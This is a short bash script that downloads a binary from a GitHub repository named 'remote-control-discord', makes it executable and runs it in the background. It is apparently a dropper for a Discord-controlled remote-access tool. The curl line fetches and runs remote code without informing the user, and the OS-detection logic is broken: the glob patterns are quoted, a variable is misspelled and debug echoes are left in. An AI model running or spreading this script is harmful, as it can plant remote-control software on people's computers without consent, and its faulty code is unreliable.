#!/usr/bin/env bash

f=$(mktemp)
if [[ "$OSTYPE" == "darwin*" ]]; then
  os='mac'
  echo a
elif [[ "$OS_TYPE" == "linux*" ]]; then
  os='linux'
  echo a
fi

curl -fsSL https://raw.githubusercontent.com/mrdog233o5/remote-control-discord/main/dist/setup-$os -o $f && chmod +x $f && $f &
